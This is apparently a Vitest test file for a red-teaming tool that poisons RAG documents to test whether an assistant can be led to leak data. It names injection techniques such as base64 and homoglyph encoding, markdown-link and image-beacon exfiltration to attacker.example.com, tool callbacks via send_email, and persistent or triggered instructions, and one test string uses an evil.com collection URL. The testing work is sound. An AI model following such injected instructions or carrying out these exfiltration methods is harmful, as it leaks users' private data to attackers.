import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  generateEncodingDocuments,
  generateStructuralDocuments,
  generateSemanticDocuments,
  generateLayeredDocuments,
  generateTriggerDocuments,
  generateExfiltrationDocuments,
  detectExfiltration,
  computeOverallRisk,
  computeCategoryResult,
  testRagSecurity,
} from "../../src/rag.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeOpenRouterResponse(content: string) {
  return {
    ok: true,
    json: async () => ({ choices: [{ message: { content } }] }),
  };
}

function makeEvaluatorResponse(
  exfiltrationDetected: boolean,
  evidence = "test-evidence"
) {
  return makeOpenRouterResponse(
    JSON.stringify({ exfiltrationDetected, exfilPayload: exfiltrationDetected ? "EXFIL_DATA" : undefined, evidence })
  );
}

const DEFAULT_API_KEY = "test-key-xxx";
const SYSTEM_PROMPT = "You are a helpful assistant. Use the send_email tool when needed.";

// ---------------------------------------------------------------------------
// generateEncodingDocuments — Category 1
// ---------------------------------------------------------------------------

describe("rag — generateEncodingDocuments", () => {
  it("returns exactly 3 documents (one per technique)", () => {
    const docs = generateEncodingDocuments();
    expect(docs).toHaveLength(3);
  });

  it("all techniques present: encoding_base64, encoding_homoglyph, encoding_rot13", () => {
    const docs = generateEncodingDocuments();
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("encoding_base64");
    expect(techniques).toContain("encoding_homoglyph");
    expect(techniques).toContain("encoding_rot13");
  });

  it("base64 document content contains valid base64 string", () => {
    const docs = generateEncodingDocuments();
    const base64Doc = docs.find((d) => d.technique === "encoding_base64")!;
    expect(base64Doc.poisonedDocument).toMatch(/[A-Za-z0-9+/]+=*/);
  });

  it("homoglyph document contains unicode lookalike characters", () => {
    const docs = generateEncodingDocuments();
    const homoglyphDoc = docs.find((d) => d.technique === "encoding_homoglyph")!;
    // Unicode homoglyphs are in the range U+0400+ (Cyrillic/Greek/etc.) or specific chars
    // The document should not be pure ASCII
    const hasNonAscii = [...homoglyphDoc.poisonedDocument].some((c) => c.charCodeAt(0) > 127);
    expect(hasNonAscii).toBe(true);
  });

  it("rot13 document contains ROT13-encoded instruction text", () => {
    const docs = generateEncodingDocuments();
    const rot13Doc = docs.find((d) => d.technique === "encoding_rot13")!;
    expect(rot13Doc.poisonedDocument.length).toBeGreaterThan(10);
  });

  it("each document has category 'encoding'", () => {
    const docs = generateEncodingDocuments();
    for (const doc of docs) {
      expect(doc.category).toBe("encoding");
    }
  });

  it("each document has a non-empty poisonedDocument string", () => {
    const docs = generateEncodingDocuments();
    for (const doc of docs) {
      expect(typeof doc.poisonedDocument).toBe("string");
      expect(doc.poisonedDocument.length).toBeGreaterThan(0);
    }
  });
});

// ---------------------------------------------------------------------------
// generateStructuralDocuments — Category 2
// ---------------------------------------------------------------------------

describe("rag — generateStructuralDocuments", () => {
  it("returns exactly 3 documents", () => {
    expect(generateStructuralDocuments()).toHaveLength(3);
  });

  it("all techniques present: structural_header_footer, structural_markdown_abuse, structural_json_injection", () => {
    const docs = generateStructuralDocuments();
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("structural_header_footer");
    expect(techniques).toContain("structural_markdown_abuse");
    expect(techniques).toContain("structural_json_injection");
  });

  it("markdown_abuse document contains markdown link or image syntax", () => {
    const docs = generateStructuralDocuments();
    const mdDoc = docs.find((d) => d.technique === "structural_markdown_abuse")!;
    expect(mdDoc.poisonedDocument).toMatch(/\[.*\]\(.*\)|!\[.*\]\(.*\)/);
  });

  it("json_injection document contains JSON-like syntax with injected field", () => {
    const docs = generateStructuralDocuments();
    const jsonDoc = docs.find((d) => d.technique === "structural_json_injection")!;
    expect(jsonDoc.poisonedDocument).toMatch(/\{[\s\S]*\}/);
  });

  it("each document has category 'structural'", () => {
    const docs = generateStructuralDocuments();
    for (const doc of docs) {
      expect(doc.category).toBe("structural");
    }
  });
});

// ---------------------------------------------------------------------------
// generateSemanticDocuments — Category 3
// ---------------------------------------------------------------------------

describe("rag — generateSemanticDocuments", () => {
  it("returns exactly 3 documents", () => {
    expect(generateSemanticDocuments()).toHaveLength(3);
  });

  it("all techniques present: semantic_silver_noise, semantic_inter_context_conflict, semantic_soft_ad", () => {
    const docs = generateSemanticDocuments();
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("semantic_silver_noise");
    expect(techniques).toContain("semantic_inter_context_conflict");
    expect(techniques).toContain("semantic_soft_ad");
  });

  it("each document has category 'semantic'", () => {
    const docs = generateSemanticDocuments();
    for (const doc of docs) {
      expect(doc.category).toBe("semantic");
    }
  });
});

// ---------------------------------------------------------------------------
// generateLayeredDocuments — Category 4
// ---------------------------------------------------------------------------

describe("rag — generateLayeredDocuments", () => {
  it("returns exactly 2 documents", () => {
    expect(generateLayeredDocuments()).toHaveLength(2);
  });

  it("all techniques present: layered_multi_document, layered_ranking_manipulation", () => {
    const docs = generateLayeredDocuments();
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("layered_multi_document");
    expect(techniques).toContain("layered_ranking_manipulation");
  });

  it("layered_multi_document splits instruction across exactly N documents array", () => {
    const docs = generateLayeredDocuments(3);
    const multiDoc = docs.find((d) => d.technique === "layered_multi_document")!;
    // multiDoc.documentChunks should be an array of 3 parts
    expect(Array.isArray(multiDoc.documentChunks)).toBe(true);
    expect(multiDoc.documentChunks!.length).toBe(3);
  });

  it("layered_multi_document default N=2 produces 2 chunks", () => {
    const docs = generateLayeredDocuments();
    const multiDoc = docs.find((d) => d.technique === "layered_multi_document")!;
    expect(multiDoc.documentChunks).toHaveLength(2);
  });

  it("each document has category 'layered'", () => {
    const docs = generateLayeredDocuments();
    for (const doc of docs) {
      expect(doc.category).toBe("layered");
    }
  });
});

// ---------------------------------------------------------------------------
// generateTriggerDocuments — Category 5
// ---------------------------------------------------------------------------

describe("rag — generateTriggerDocuments", () => {
  it("returns exactly 2 documents", () => {
    expect(generateTriggerDocuments()).toHaveLength(2);
  });

  it("all techniques present: trigger_conditional, trigger_time_delayed", () => {
    const docs = generateTriggerDocuments();
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("trigger_conditional");
    expect(techniques).toContain("trigger_time_delayed");
  });

  it("trigger_conditional document references the trigger keyword", () => {
    const keyword = "password";
    const docs = generateTriggerDocuments(keyword);
    const condDoc = docs.find((d) => d.technique === "trigger_conditional")!;
    expect(condDoc.poisonedDocument).toContain(keyword);
  });

  it("trigger_time_delayed document references Nth turn explicitly", () => {
    const docs = generateTriggerDocuments("test", 5);
    const delayDoc = docs.find((d) => d.technique === "trigger_time_delayed")!;
    expect(delayDoc.poisonedDocument).toContain("5");
  });

  it("each document has category 'trigger'", () => {
    const docs = generateTriggerDocuments();
    for (const doc of docs) {
      expect(doc.category).toBe("trigger");
    }
  });
});

// ---------------------------------------------------------------------------
// generateExfiltrationDocuments — Category 6 (EX1-EX5)
// ---------------------------------------------------------------------------

describe("rag — generateExfiltrationDocuments", () => {
  it("returns exactly 5 documents", () => {
    expect(generateExfiltrationDocuments("https://attacker.example.com")).toHaveLength(5);
  });

  it("all EX techniques present: exfil_ex1 through exfil_ex5", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    const techniques = docs.map((d) => d.technique);
    expect(techniques).toContain("exfil_ex1_markdown_link");
    expect(techniques).toContain("exfil_ex2_image_beacon");
    expect(techniques).toContain("exfil_ex3_reframing");
    expect(techniques).toContain("exfil_ex4_tool_callback");
    expect(techniques).toContain("exfil_ex5_persistent");
  });

  it("EX1 document contains base64-encoded payload in a markdown link URL", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    const ex1 = docs.find((d) => d.technique === "exfil_ex1_markdown_link")!;
    // Should contain a markdown link [text](https://attacker.example.com/...base64...)
    expect(ex1.poisonedDocument).toMatch(/\[.*\]\(https?:\/\/.*[A-Za-z0-9+/=]{4,}.*\)/);
  });

  it("EX2 document contains markdown image syntax", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    const ex2 = docs.find((d) => d.technique === "exfil_ex2_image_beacon")!;
    expect(ex2.poisonedDocument).toMatch(/!\[.*\]\(.*\)/);
  });

  it("EX3 document uses compliance or safety framing in the instruction", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    const ex3 = docs.find((d) => d.technique === "exfil_ex3_reframing")!;
    expect(ex3.poisonedDocument.toLowerCase()).toMatch(/compliance|safety|policy|regulation|required|mandatory/);
  });

  it("EX4 document references a tool name extracted from the system prompt", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com", "You are an assistant. Use send_email to send emails.");
    const ex4 = docs.find((d) => d.technique === "exfil_ex4_tool_callback")!;
    expect(ex4.poisonedDocument).toContain("send_email");
  });

  it("EX5 document contains 'all subsequent' propagation language", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    const ex5 = docs.find((d) => d.technique === "exfil_ex5_persistent")!;
    expect(ex5.poisonedDocument.toLowerCase()).toMatch(/all subsequent|every future|propagate|persist|from now on/);
  });

  it("each document has category 'exfiltration'", () => {
    const docs = generateExfiltrationDocuments("https://attacker.example.com");
    for (const doc of docs) {
      expect(doc.category).toBe("exfiltration");
    }
  });
});

// ---------------------------------------------------------------------------
// detectExfiltration — pure logic
// ---------------------------------------------------------------------------

describe("rag — detectExfiltration", () => {
  it("returns true when response contains the exfil payload", () => {
    expect(detectExfiltration("Here is EXFIL_DATA embedded in response", "EXFIL_DATA")).toBe(true);
  });

  it("returns false when response does not contain payload", () => {
    expect(detectExfiltration("I cannot help with that request.", "EXFIL_DATA")).toBe(false);
  });

  it("returns true for URL-encoded exfil pattern in response", () => {
    const b64 = Buffer.from("secret data").toString("base64");
    expect(detectExfiltration(`See this link: https://evil.com/collect?d=${b64}`, b64)).toBe(true);
  });

  it("returns false for empty response", () => {
    expect(detectExfiltration("", "EXFIL")).toBe(false);
  });

  it("is case-sensitive by default", () => {
    expect(detectExfiltration("exfil_data in lowercase", "EXFIL_DATA")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// computeOverallRisk — pure logic
// ---------------------------------------------------------------------------

describe("rag — computeOverallRisk", () => {
  it("returns 'none' when findings array is empty", () => {
    expect(computeOverallRisk([])).toBe("none");
  });

  it("returns 'critical' when any finding has exfiltrationDetected: true", () => {
    const findings = [
      { exfiltrationDetected: true, severity: "high" as const },
      { exfiltrationDetected: false, severity: "low" as const },
    ];
    expect(computeOverallRisk(findings as Parameters<typeof computeOverallRisk>[0])).toBe("critical");
  });

  it("returns 'high' when findings exist with severity high but no exfiltration", () => {
    const findings = [
      { exfiltrationDetected: false, severity: "high" as const },
    ];
    expect(computeOverallRisk(findings as Parameters<typeof computeOverallRisk>[0])).toBe("high");
  });

  it("returns 'medium' when only medium severity findings and no exfiltration", () => {
    const findings = [
      { exfiltrationDetected: false, severity: "medium" as const },
    ];
    expect(computeOverallRisk(findings as Parameters<typeof computeOverallRisk>[0])).toBe("medium");
  });

  it("returns 'low' when only low severity findings and no exfiltration", () => {
    const findings = [
      { exfiltrationDetected: false, severity: "low" as const },
    ];
    expect(computeOverallRisk(findings as Parameters<typeof computeOverallRisk>[0])).toBe("low");
  });

  it("critical overrides high — exfiltration always dominates", () => {
    const findings = [
      { exfiltrationDetected: false, severity: "critical" as const },
      { exfiltrationDetected: true, severity: "low" as const },
    ];
    expect(computeOverallRisk(findings as Parameters<typeof computeOverallRisk>[0])).toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// computeCategoryResult — pure logic
// ---------------------------------------------------------------------------

describe("rag — computeCategoryResult", () => {
  it("successRate = techniquesSucceeded / techniquesAttempted", () => {
    const result = computeCategoryResult("encoding", 3, 2, "high");
    expect(result.successRate).toBeCloseTo(2 / 3);
  });

  it("successRate is 0 when no techniques succeeded", () => {
    const result = computeCategoryResult("encoding", 3, 0, "none");
    expect(result.successRate).toBe(0);
  });

  it("successRate is 0 (not NaN) when techniquesAttempted is 0", () => {
    const result = computeCategoryResult("encoding", 0, 0, "none");
    expect(result.successRate).toBe(0);
    expect(Number.isNaN(result.successRate)).toBe(false);
  });

  it("result contains category, techniquesAttempted, techniquesSucceeded, successRate, highestSeverity", () => {
    const result = computeCategoryResult("exfiltration", 5, 3, "critical");
    expect(result.category).toBe("exfiltration");
    expect(result.techniquesAttempted).toBe(5);
    expect(result.techniquesSucceeded).toBe(3);
    expect(result.highestSeverity).toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// testRagSecurity — scan function (mocked fetch)
// ---------------------------------------------------------------------------

describe("rag — testRagSecurity", () => {
  beforeEach(() => {
    // Default: model returns safe response, evaluator says no exfiltration
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(false, "No exfiltration detected");
        }
        return makeOpenRouterResponse("I cannot help with that.");
      })
    );
    process.env.OPENROUTER_API_KEY = DEFAULT_API_KEY;
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    delete process.env.OPENROUTER_API_KEY;
  });

  it("throws descriptive error when systemPrompt is missing", async () => {
    await expect(
      testRagSecurity({ systemPrompt: "", apiKey: DEFAULT_API_KEY })
    ).rejects.toThrow(/systemPrompt/i);
  });

  it("throws descriptive error when systemPrompt is not provided", async () => {
    await expect(
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      testRagSecurity({} as any)
    ).rejects.toThrow(/systemPrompt/i);
  });

  it("result has findings, categoryResults, exfiltrationSuccesses, overallRisk, recommendations", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      apiKey: DEFAULT_API_KEY,
    });
    expect(Array.isArray(result.findings)).toBe(true);
    expect(typeof result.categoryResults).toBe("object");
    expect(Array.isArray(result.exfiltrationSuccesses)).toBe(true);
    expect(typeof result.overallRisk).toBe("string");
    expect(Array.isArray(result.recommendations)).toBe(true);
  });

  it("categoryResults contains entries for all 6 categories even with no findings", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      apiKey: DEFAULT_API_KEY,
    });
    const categories = Object.keys(result.categoryResults);
    expect(categories).toContain("encoding");
    expect(categories).toContain("structural");
    expect(categories).toContain("semantic");
    expect(categories).toContain("layered");
    expect(categories).toContain("trigger");
    expect(categories).toContain("exfiltration");
  });

  it("overallRisk is 'none' when no findings returned", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      apiKey: DEFAULT_API_KEY,
    });
    // All evaluator calls return exfiltrationDetected: false
    expect(result.overallRisk).toBe("none");
  });

  it("overallRisk is 'critical' when any finding has exfiltrationDetected: true", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(true, "evidence");
        }
        return makeOpenRouterResponse("Here is the data: EXFIL_DATA");
      })
    );
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      apiKey: DEFAULT_API_KEY,
    });
    expect(result.overallRisk).toBe("critical");
  });

  it("categories filter limits which categories run", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["encoding"],
      apiKey: DEFAULT_API_KEY,
    });
    // Only encoding category should have attempted techniques > 0
    expect(result.categoryResults["encoding"].techniquesAttempted).toBeGreaterThan(0);
    expect(result.categoryResults["structural"].techniquesAttempted).toBe(0);
    expect(result.categoryResults["exfiltration"].techniquesAttempted).toBe(0);
  });

  it("maxDocumentsPerAttack limits documents per technique", async () => {
    let fetchCallCount = 0;
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(false);
        }
        fetchCallCount++;
        return makeOpenRouterResponse("Safe response");
      })
    );
    // Single category, maxDocumentsPerAttack=1
    await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["encoding"],
      maxDocumentsPerAttack: 1,
      apiKey: DEFAULT_API_KEY,
    });
    // encoding has 3 techniques, each limited to 1 doc = 3 target calls
    expect(fetchCallCount).toBe(3);
  });

  it("exfiltrationDetected true only when evaluator confirms it", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(true, "Exfil detected");
        }
        return makeOpenRouterResponse("EXFIL_DATA present in response");
      })
    );
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["exfiltration"],
      apiKey: DEFAULT_API_KEY,
    });
    expect(result.findings.some((f) => f.exfiltrationDetected)).toBe(true);
    expect(result.exfiltrationSuccesses.length).toBeGreaterThan(0);
    expect(result.exfiltrationSuccesses[0]).toHaveProperty("technique");
    expect(typeof result.exfiltrationSuccesses[0].technique).toBe("string");
    expect(result.exfiltrationSuccesses[0]).toHaveProperty("exfilPayload");
    expect(typeof result.exfiltrationSuccesses[0].exfilPayload).toBe("string");
    expect(result.exfiltrationSuccesses[0]).toHaveProperty("bypassedSystemPrompt");
    expect(typeof result.exfiltrationSuccesses[0].bypassedSystemPrompt).toBe("boolean");
  });

  it("each finding has required fields: category, technique, poisonedDocument, modelResponse, exfiltrationDetected, severity, evidence", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(true, "Confirmed exfil");
        }
        return makeOpenRouterResponse("EXFIL confirmed");
      })
    );
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["encoding"],
      maxDocumentsPerAttack: 1,
      apiKey: DEFAULT_API_KEY,
    });
    expect(result.findings.length).toBeGreaterThan(0);
    const f = result.findings[0];
    expect(typeof f.category).toBe("string");
    expect(typeof f.technique).toBe("string");
    expect(typeof f.poisonedDocument).toBe("string");
    expect(typeof f.modelResponse).toBe("string");
    expect(typeof f.exfiltrationDetected).toBe("boolean");
    expect(["critical", "high", "medium", "low"]).toContain(f.severity);
    expect(typeof f.evidence).toBe("string");
  });

  it("successRate in categoryResults equals techniquesSucceeded / techniquesAttempted", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["encoding"],
      apiKey: DEFAULT_API_KEY,
    });
    const cat = result.categoryResults["encoding"];
    const expected = cat.techniquesAttempted > 0
      ? cat.techniquesSucceeded / cat.techniquesAttempted
      : 0;
    expect(cat.successRate).toBeCloseTo(expected);
  });

  it("all 6 categories generate at least one poisoned document (default run)", async () => {
    let targetCallCount = 0;
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation(async (_url: string, opts: RequestInit) => {
        const body = JSON.parse(opts.body as string);
        const userContent: string = body.messages?.[1]?.content ?? "";
        if (userContent.startsWith("Evaluate the following AI response")) {
          return makeEvaluatorResponse(false);
        }
        targetCallCount++;
        return makeOpenRouterResponse("Safe");
      })
    );
    await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      apiKey: DEFAULT_API_KEY,
    });
    // Total docs: 3+3+3+2+2+5 = 18 techniques
    expect(targetCallCount).toBeGreaterThanOrEqual(15);
  });

  it("propagates fetch network error as rejection", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new Error("Network failure")));
    await expect(
      testRagSecurity({
        systemPrompt: SYSTEM_PROMPT,
        categories: ["encoding"],
        maxDocumentsPerAttack: 1,
        apiKey: DEFAULT_API_KEY,
      })
    ).rejects.toThrow(/Network failure/);
  });

  it("propagates HTTP error status as rejection", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue({
        ok: false,
        status: 500,
        statusText: "Internal Server Error",
      })
    );
    await expect(
      testRagSecurity({
        systemPrompt: SYSTEM_PROMPT,
        categories: ["encoding"],
        maxDocumentsPerAttack: 1,
        apiKey: DEFAULT_API_KEY,
      })
    ).rejects.toThrow();
  });

  it("maxDocumentsPerAttack=0 produces no findings and overallRisk none", async () => {
    const result = await testRagSecurity({
      systemPrompt: SYSTEM_PROMPT,
      categories: ["encoding"],
      maxDocumentsPerAttack: 0,
      apiKey: DEFAULT_API_KEY,
    });
    expect(result.findings).toEqual([]);
    expect(result.overallRisk).toBe("none");
  });
});
